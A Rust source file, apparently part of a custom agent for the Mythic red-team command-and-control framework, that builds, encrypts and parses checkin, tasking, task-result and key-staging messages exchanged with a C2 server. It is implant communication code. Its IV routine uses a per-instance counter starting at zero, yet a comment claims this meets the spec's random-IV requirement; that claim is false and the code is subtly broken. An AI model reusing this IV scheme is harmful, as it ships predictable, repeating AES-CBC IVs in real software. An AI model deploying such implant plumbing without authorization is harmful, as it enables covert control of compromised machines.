use alloc::{
    string::String,
    vec::Vec,
};
use core::cell::Cell;
use uuid::Uuid;

use crate::c2::{C2Transport, MythicError};
use crate::protocol::{
    crypto::AES256_IV_LEN, Aes256HmacCrypto, CheckinInfo, MythicMessageError, ReqCheckin,
    ReqGetTasking,
    ReqPostResponse, ReqStagingRSA, ReqStagingTranslation, RespCheckin, RespGetTasking,
    RespPostResponse, RespStagingRSA, RespStagingTranslation, TaskResponse, decode_message,
    decode_message_plain, encode_message, encode_message_plain,
};

/// High-level facade for building and parsing Mythic protocol messages.
///
/// Holds the agent's current UUID (payload UUID, temp UUID, or callback UUID
/// depending on the phase) and optional AES crypto keys.  Every `build_*` /
/// `parse_*` method automatically picks the right wire encoding (plain or
/// AES-256-CBC-HMAC encrypted) based on whether crypto keys are set.
///
/// When encryption is active a fresh IV is generated per message via an
/// internal counter — unique per message, matching the Mythic spec's
/// requirement for a per-message random IV.
///
/// # UUID lifecycle
///
/// ```text
/// payloadUUID                          ←  payload execution starts
///   │
///   ├─ checkin ──────────────────────→ callbackUUID   (plain / static)
///   │
///   └─ staging_rsa ──→ tempUUID ──→ checkin ──→ callbackUUID   (RSA EKE)
/// ```
///
/// After receiving a checkin response or staging_rsa response, call
/// [`set_agent_uuid`](Mythic::set_agent_uuid) with the new UUID returned by the server.
pub struct Mythic {
    agent_uuid: Uuid,
    crypto: Option<Aes256HmacCrypto>,
    iv_counter: Cell<u64>,
}

impl Mythic {
    // ── Constructors ──────────────────────────────────

    /// Plaintext mode — no encryption (`crypto_type = "none"`).
    pub fn new(agent_uuid: Uuid) -> Self {
        Self { agent_uuid, crypto: None, iv_counter: Cell::new(0) }
    }

    /// Encrypted mode — the pre-shared AES key (static key) or initial
    /// AESPSK for staging.
    pub fn with_crypto(agent_uuid: Uuid, crypto: Aes256HmacCrypto) -> Self {
        Self { agent_uuid, crypto: Some(crypto), iv_counter: Cell::new(0) }
    }

    /// Build a `Mythic` instance by reading the C2's own crypto configuration.
    ///
    /// Reads [`C2Transport::aes_psk`] (base64 key) and constructs an
    /// [`Aes256HmacCrypto`].  If the C2 provides no key, the instance is
    /// plaintext.
    pub fn from_c2(agent_uuid: Uuid, c2: &impl C2Transport) -> Self {
        let crypto = c2
            .aes_psk()
            .and_then(|b64| Aes256HmacCrypto::from_base64_key(&b64).ok());
        Self { agent_uuid, crypto, iv_counter: Cell::new(0) }
    }

    // ── State ─────────────────────────────────────────

    /// Current outer UUID used in message framing.
    pub fn agent_uuid(&self) -> Uuid {
        self.agent_uuid
    }

    /// Update the outer UUID (e.g. after receiving a temp UUID from
    /// staging_rsa or a callback UUID from checkin).
    pub fn set_agent_uuid(&mut self, uuid: Uuid) {
        self.agent_uuid = uuid;
    }

    /// Replace the crypto keys (e.g. after RSA key exchange completes).
    pub fn set_crypto(&mut self, crypto: Aes256HmacCrypto) {
        self.crypto = Some(crypto);
    }

    // ── Checkin ───────────────────────────────────────

    /// Build a wire-ready checkin packet from host information.
    pub fn build_checkin(&self, info: CheckinInfo) -> Result<String, MythicMessageError> {
        let req = ReqCheckin::new(self.agent_uuid, info);
        self.encode(&req)
    }

    /// Build a minimal checkin packet (no host info).
    pub fn build_checkin_minimal(&self) -> Result<String, MythicMessageError> {
        let req = ReqCheckin::minimal(self.agent_uuid);
        self.encode(&req)
    }

    /// Parse a checkin response, returning the server UUID and response data.
    pub fn parse_checkin(
        &self,
        packed: &str,
    ) -> Result<(Uuid, RespCheckin), MythicMessageError> {
        self.decode(packed)
    }

    // ── GetTasking ────────────────────────────────────

    /// Build a `get_tasking` poll.  `tasking_size` is the max number of tasks to
    /// request (-1 for all).
    pub fn build_get_tasking(
        &self,
        tasking_size: i32,
    ) -> Result<String, MythicMessageError> {
        let req = ReqGetTasking::new(tasking_size);
        self.encode(&req)
    }

    /// Parse a `get_tasking` response, returning the list of pending tasks.
    pub fn parse_get_tasking(
        &self,
        packed: &str,
    ) -> Result<(Uuid, RespGetTasking), MythicMessageError> {
        self.decode(packed)
    }

    // ── PostResponse ──────────────────────────────────

    /// Build a `post_response` packet containing task results.
    pub fn build_post_response(
        &self,
        responses: Vec<TaskResponse>,
    ) -> Result<String, MythicMessageError> {
        let req = ReqPostResponse::new(responses);
        self.encode(&req)
    }

    /// Parse a `post_response` acknowledgement.
    pub fn parse_post_response(
        &self,
        packed: &str,
    ) -> Result<(Uuid, RespPostResponse), MythicMessageError> {
        self.decode(packed)
    }

    // ── Staging RSA ───────────────────────────────────

    /// Build a `staging_rsa` packet containing the agent's RSA public key.
    ///
    /// Encrypted with the current crypto if set (AESPSK), plain otherwise.
    pub fn build_staging_rsa(
        &self,
        pub_key: &str,
        session_id: &str,
    ) -> Result<String, MythicMessageError> {
        let req = ReqStagingRSA::new(pub_key.into(), session_id.into());
        self.encode(&req)
    }

    /// Parse a `staging_rsa` response containing the RSA-encrypted session key
    /// and temporary UUID.
    pub fn parse_staging_rsa(
        &self,
        packed: &str,
    ) -> Result<(Uuid, RespStagingRSA), MythicMessageError> {
        self.decode(packed)
    }

    // ── Staging Translation ───────────────────────────

    /// Build a `staging_translation` packet for custom EKE key exchange.
    ///
    /// Typically used by translation containers rather than directly by
    /// agents.  Encrypted with the current crypto if set.
    pub fn build_staging_translation(
        &self,
        session_id: &str,
        enc_key: &str,
        dec_key: &str,
        crypto_type: &str,
        next_uuid: Uuid,
        message: &str,
    ) -> Result<String, MythicMessageError> {
        let req = ReqStagingTranslation::new(
            session_id.into(),
            enc_key.into(),
            dec_key.into(),
            crypto_type.into(),
            next_uuid,
            message.into(),
        );
        self.encode(&req)
    }

    /// Parse a `staging_translation` response.
    pub fn parse_staging_translation(
        &self,
        packed: &str,
    ) -> Result<(Uuid, RespStagingTranslation), MythicMessageError> {
        self.decode(packed)
    }

    // ── Combined: build → send → parse ───────────────

    /// Build a checkin, deliver via `c2`, and parse the response.
    pub fn checkin<C: C2Transport>(
        &self,
        info: CheckinInfo,
        c2: &C,
    ) -> Result<(Uuid, RespCheckin), MythicError<C::Error>> {
        let pkt = self.build_checkin(info)?;
        let reply = c2.checkin(&pkt).map_err(MythicError::Transport)?;
        Ok(self.parse_checkin(&reply)?)
    }

    /// Build a minimal checkin, deliver via `c2`, and parse the response.
    pub fn checkin_minimal<C: C2Transport>(
        &self,
        c2: &C,
    ) -> Result<(Uuid, RespCheckin), MythicError<C::Error>> {
        let pkt = self.build_checkin_minimal()?;
        let reply = c2.checkin(&pkt).map_err(MythicError::Transport)?;
        Ok(self.parse_checkin(&reply)?)
    }

    /// Build a `get_tasking`, deliver via `c2`, and parse the response.
    pub fn get_tasking<C: C2Transport>(
        &self,
        tasking_size: i32,
        c2: &C,
    ) -> Result<(Uuid, RespGetTasking), MythicError<C::Error>> {
        let pkt = self.build_get_tasking(tasking_size)?;
        let reply = c2.get_tasking(&pkt).map_err(MythicError::Transport)?;
        Ok(self.parse_get_tasking(&reply)?)
    }

    /// Build a `post_response`, deliver via `c2`, and parse the response.
    pub fn post_response<C: C2Transport>(
        &self,
        responses: Vec<TaskResponse>,
        c2: &C,
    ) -> Result<(Uuid, RespPostResponse), MythicError<C::Error>> {
        let pkt = self.build_post_response(responses)?;
        let reply = c2.post_response(&pkt).map_err(MythicError::Transport)?;
        Ok(self.parse_post_response(&reply)?)
    }

    /// Build a `staging_rsa`, deliver via `c2`, and parse the response.
    pub fn staging_rsa<C: C2Transport>(
        &self,
        pub_key: &str,
        session_id: &str,
        c2: &C,
    ) -> Result<(Uuid, RespStagingRSA), MythicError<C::Error>> {
        let pkt = self.build_staging_rsa(pub_key, session_id)?;
        let reply = c2.staging_rsa(&pkt).map_err(MythicError::Transport)?;
        Ok(self.parse_staging_rsa(&reply)?)
    }

    /// Build a `staging_translation`, deliver via `c2`, and parse the response.
    pub fn staging_translation<C: C2Transport>(
        &self,
        session_id: &str,
        enc_key: &str,
        dec_key: &str,
        crypto_type: &str,
        next_uuid: Uuid,
        message: &str,
        c2: &C,
    ) -> Result<(Uuid, RespStagingTranslation), MythicError<C::Error>> {
        let pkt = self.build_staging_translation(
            session_id, enc_key, dec_key, crypto_type, next_uuid, message,
        )?;
        let reply = c2
            .staging_translation(&pkt)
            .map_err(MythicError::Transport)?;
        Ok(self.parse_staging_translation(&reply)?)
    }

    // ── Internals ─────────────────────────────────────

    fn next_iv(&self) -> [u8; AES256_IV_LEN] {
        let n = self.iv_counter.get();
        self.iv_counter.set(n.wrapping_add(1));
        let mut iv = [0u8; AES256_IV_LEN];
        iv[..8].copy_from_slice(&n.to_le_bytes());
        iv
    }

    fn encode<T: serde::Serialize>(
        &self,
        msg: &T,
    ) -> Result<String, MythicMessageError> {
        match &self.crypto {
            Some(c) => encode_message(msg, self.agent_uuid, c, &self.next_iv()),
            None => encode_message_plain(msg, self.agent_uuid),
        }
    }

    fn decode<T: serde::de::DeserializeOwned>(
        &self,
        packed: &str,
    ) -> Result<(Uuid, T), MythicMessageError> {
        match &self.crypto {
            Some(c) => decode_message(packed, Some(self.agent_uuid), c),
            None => decode_message_plain(packed, Some(self.agent_uuid)),
        }
    }
}
